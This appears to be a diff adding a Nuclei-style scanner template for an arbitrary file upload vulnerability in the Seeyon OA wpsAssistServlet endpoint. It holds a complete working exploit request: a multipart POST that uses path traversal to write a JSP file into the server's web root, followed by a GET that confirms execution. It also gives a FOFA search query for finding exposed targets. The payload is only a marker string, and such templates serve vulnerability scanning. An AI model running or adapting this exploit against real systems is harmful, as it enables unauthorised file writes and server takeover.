@@ -1,0 +1,47 @@
+id: wps
+info:
+  name: wpsAssistServlet 任意文件上传
+  author: SleepingBag945
+  severity: critical
+  description: 致远OA wpsAssistServlet接口存在任意文件上传漏洞，攻击者通过漏洞可以发送特定的请求包上传恶意文件，获取服务器权限。
+  metadata:
+    max-request: 1
+    verified: true
+    fofa-query: app="致远互联-OA" && title="V8.0SP2"
+  tags: cnvd,cnvd2023,hongjing,hcm
+
+http:
+  - raw:
+      - |
+        POST /seeyon/wpsAssistServlet?flag=save&realFileType=../../../../ApacheJetspeed/webapps/ROOT/mikes.jsp&fileId=2 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: close
+        Content-Length: 217
+        Content-Type: multipart/form-data; boundary=a4d7586ac9d50625dee11e86fa69bc71
+
+        --a4d7586ac9d50625dee11e86fa69bc71
+        Content-Disposition: form-data; name="upload"; filename="123.xls"
+        Content-Type: application/vnd.ms-excel
+
+        <% out.println("20231101");%>  
+        --a4d7586ac9d50625dee11e86fa69bc71--
+
+  - raw:
+      - |
+        GET /mikes.jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
+        Accept-Encoding: gzip, deflate
+
+    matchers:
+      # - type: dsl
+      #   dsl:
+      #     - 'status_code == 200'
+      #     - 'contains_all(body,"data")'
+      #   condition: and
+      - type: word
+        words:
+          - "20231101"
